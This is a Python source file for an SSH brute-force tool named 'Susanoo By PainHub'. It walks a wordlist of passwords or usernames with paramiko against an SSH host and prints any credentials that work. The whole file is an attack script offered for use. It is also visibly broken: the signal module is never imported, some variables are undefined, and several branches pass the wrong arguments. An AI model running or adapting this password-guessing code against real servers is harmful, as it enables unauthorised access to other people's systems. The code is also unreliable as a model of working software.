import argparse
import string
import os
import time
import sys, getopt
import pdb
from pwn  import *
from paramiko import SSHClient
from cprint import cprint
import pyfiglet

#Global vars
url = "127.0.0.1"
passwd_to_guess = "lilgrl"
rhost = ""
username = ""
passwd = ""
port = ""
is_setW = False
is_setP = False
is_setSSH = False
#lower case = list
is_setlogin = False
is_setpass= False
#Upper case = user knows data
is_setLOGIN = False
is_setPASS = False
#Values for arguments
port_val = ""
login_val = ""
pass_val = ""
login_VAL = ""
pass_VAL = ""
is_setSSH = False
client = SSHClient()
enc = 'cp437'

# Remove 1st argument from the
# list of command line arguments
argument_list = sys.argv[1:]

options = "p:P:hw:ul:L:"
long_options = ["help","url","wordlist =", "p =", "P =","ssh", "l =", "L =", "LOGIN", "port ="]

def def_handler(sig,frame):
    cprint("\n\n[!] Exiting...\n", c="b")
    sys.exit(1)


#Ctrl+C
signal.signal(signal.SIGINT,def_handler)
time.sleep(1)

def help():
    print("Syntax: python3 bruteit.py -u [url] -w [/path/to/wordlist]")
    print("SSH Syntax: python3 bruteit.py -l [/path/to/wordlist] -p [/path/to/wordlist]\nIf user or password is already known use -L login or -P passwd\n")
    print("Optional arguments: \n\n--port         specify ssh port in case it is not the default one")

def connect_ssh(path, username, pas, port_val):
    client = SSHClient()
    if username and not pas:
        with open(path, "r", encoding=enc) as wordlist:
            print("Path to wordlist: "+path)
            p1 = log.progress("Data")
            p1.status("Loading necessary data")
            time.sleep(2)
            p1.success("List obtained")
            p2 = log.progress("Username")
            p2.status("Obtaining username")
            time.sleep(2)
            p3 = log.progress("Password")
            p3.status("Obtaining password to try...")
            p2.success("Initializing bruteforce attack for user %s", username)
        
            for pasw in wordlist:
                p3.status("Checking for %s:%s",username, pasw)
                try:
                    client.load_system_host_keys()
                    client.connect(url, port=int(port_val), username=username, password=pasw.strip())
                    client.close()
                    cprint("\n\n[+] Susanoo found working credentials "+username+":"+pasw.strip(), c="b")
                    cprint("\n\n[!] Exiting...\n", c="b")
                    sys.exit(1)
                except Exception as e:
                    if "port" in str(e):
                        cprint("[!] Woops seems like we can't connect through that port...\n", c="b")
                        cprint("[!] Exiting...\n", c="r")
                        sys.exit(1)

    elif pas and not username:
         with open(path, "r", encoding=enc) as wordlist:
            print("Path to wordlist: "+path)
            p1 = log.progress("Data")
            p1.status("Loading necessary data")
            time.sleep(2)
            p1.success("List obtained")
            p2 = log.progress("Username")
            p2.status("Obtaining username")
            time.sleep(2)
            p3 = log.progress("Password")
            p3.status("Obtaining password to try...")
            p2.success("Initializing bruteforce attack for password %s", pas)
            for usr in wordlist:
                p3.status("Checking for %s:%s",usr, pas)
            
                try:
                    client.load_system_host_keys()
                    client.connect(url, port=port_val, username=usr, password=pas)
                    client.close()
                    p4 = log.progress("Status")
                    time.sleep(1)
                    p4.success("Susanoo found working credentials -> %s:%s",usr, pas)
                    print("\n\n[!] Exiting...\n")   
                    sys.exit(1)
                except Exception as e:
                    
                    pass

                        

def susanoo():
    banner = pyfiglet.figlet_format("Susanoo By PainHub", font="slant")
    cprint(banner, c="rI")
    arguments, values = getopt.getopt(argument_list, options, long_options)
    if len(argument_list) > 1:

        #we check if one of the two arguments we passed are -h, if so we print the help function and finish the script. Else we move on
        for currentArgument, currentValue in arguments:
            if currentArgument.strip() == "-h" or currentArgument == "--help":
                help()
                exit()
            elif currentArgument.strip() == "-w" or currentArgument == "--wordlist":
                global is_setW 
                is_setW = True
            elif currentArgument.strip() == "--ssh":
                global is_setSSH 
                is_setSSH = True
            elif currentArgument.strip() == "--port":
                global is_setP 
                global port_val
                port_val = currentValue
                is_setP = True
            elif currentArgument.strip() == "-l":
                global is_setlogin
                global login_val
                is_setlogin = True
                login_val = currentValue
            elif currentArgument.strip() == "-L":
                global is_setLOGIN 
                global login_VAL
                is_setLOGIN = True
                login_VAL = currentValue
            elif currentArgument.strip() == "-p":
                global is_setpass 
                global pass_val
                is_setpass = True
            
                pass_val = currentValue
            elif currentArgument.strip() == "-P":
                global is_setPASS
                global pass_VAL
                is_setPASS = True
                pass_VAL = currentValue

        if(is_setSSH):
            if(is_setP):
                if(is_setlogin):
                    if(is_setpass):
                        connect_ssh(pass_val, "","",port_val)
                elif(is_setLOGIN):
                    if(is_setpass):
                        connect_ssh(pass_val, login_VAL, "", port_val)
                    else:
                        try:
                            client.connect(url, port=port_val, username=login_VAL, password=pass_VAL)
                            client.close()
                            p4.success("Susanoo found working credentials -> %s:%s",username, pasw)
                            print("\n\n[!] Exiting...\n")
                            sys.exit(1)
                        except Exception as e:
                            client.close()
                            p4.failure("Susanoo could not find valid credentials")
                            print("\n\n[!] Exiting...\n")
                            sys.exit(1)
            else:
                port_val = "22"
                
    elif len(argument_list) == 1:
        for currentArgument, currentValue in arguments:
            if currentArgument in ("-h","--help"):
                help()

    else:
        help()

if __name__ == '__main__':  # do not run on import
    susanoo()